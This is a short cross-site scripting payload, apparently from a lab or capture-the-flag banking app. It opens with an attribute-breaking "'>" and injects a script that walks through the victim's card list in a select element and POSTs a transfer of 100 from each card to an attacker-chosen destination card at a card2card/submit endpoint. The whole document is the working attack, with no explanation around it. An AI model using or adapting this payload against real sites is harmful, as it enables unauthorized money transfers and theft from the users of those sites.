'>
<script>
for(var i = 1; i < $('select')[0].length; i++){
  xhr = new XMLHttpRequest();
  xhr.open("POST", "http://10.0.23.24:7777/card2card/submit", true);
  xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
  xhr.send("from_card=" + $('select')[0][i].value + "&to_card=INSERT_DEST_CARD_HERE&amount=100&message=g3th4x3d!1");
}
</script>
